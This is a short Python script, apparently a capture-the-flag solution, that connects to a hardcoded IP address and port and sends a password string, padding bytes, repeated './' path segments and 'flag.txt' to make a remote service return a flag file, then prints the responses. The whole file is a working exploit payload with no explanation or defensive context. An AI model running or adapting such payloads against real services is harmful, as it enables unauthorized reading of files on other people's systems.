import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("128.199.224.175",13000))


print(s.recv(1024))
buf = "kaiokenx20"
buf += "A" * 6
buf += "./" * 14
buf += "flag.txt"
buf += "\n"

s.send(buf)
print(s.recv(1024))
s.send("0\n");
print(s.recv(10000000))
print(s.recv(1024))
print(s.recv(1024))
print(s.recv(1024))
s.close()
